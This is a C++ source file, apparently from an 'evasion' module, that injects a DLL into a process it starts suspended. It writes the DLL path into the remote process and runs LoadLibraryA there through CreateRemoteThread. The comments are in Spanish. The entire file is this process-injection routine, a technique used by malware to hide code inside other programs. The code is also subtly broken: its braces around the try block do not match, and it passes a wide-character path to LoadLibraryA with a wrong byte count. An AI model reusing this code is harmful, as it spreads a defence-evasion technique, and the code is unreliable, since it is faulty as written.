#include "evasion/DllInjection.h"

DllInjection::DllInjection() {}

DllInjection::~DllInjection() {}

bool DllInjection::Inject(const std::filesystem::path& targetProcess, const std::filesystem::path& dllPath)
	try {
		// 1. Crear el proceso suspendido
		PROCESS_INFORMATION pi = _CreateSuspendedProcess(targetProcess);

		// 2. Asignar memoria para la ruta del DLL
		LPVOID dllPathAddress = _AllocateRemoteMemory(pi.hProcess, dllPath.size() + 1);
		_WriteRemoteMemory(pi.hProcess, dllPathAddress, dllPath.c_str(), dllPath.size() + 1);

		// 3. Obtener la dirección de LoadLibraryA
		LPVOID loadLibraryAddr = _GetLoadLibraryAddress();

		// 4. Crear un hilo remoto para ejecutar LoadLibraryA
		HANDLE hRemoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, dllPathAddress, 0, NULL);
		if (hRemoteThread == NULL) {
			throw std::runtime_error("Error creando el hilo remoto");
		}

		// 5. Esperar a que el hilo termine
		WaitForSingleObject(hRemoteThread, INFINITE);

		// 6. Limpiar recursos
		CloseHandle(hRemoteThread);
		VirtualFreeEx(pi.hProcess, dllPathAddress, 0, MEM_RELEASE);

		// 7. Reanudar el proceso
		_ResumeProcess(pi);

		std::cout << "DLL cargada exitosamente." << std::endl;
		return true;
	}
	catch (const std::exception& e) {
		std::cerr << "Error en InjectDLL: " << e.what() << std::endl;
	}

	return false;
}
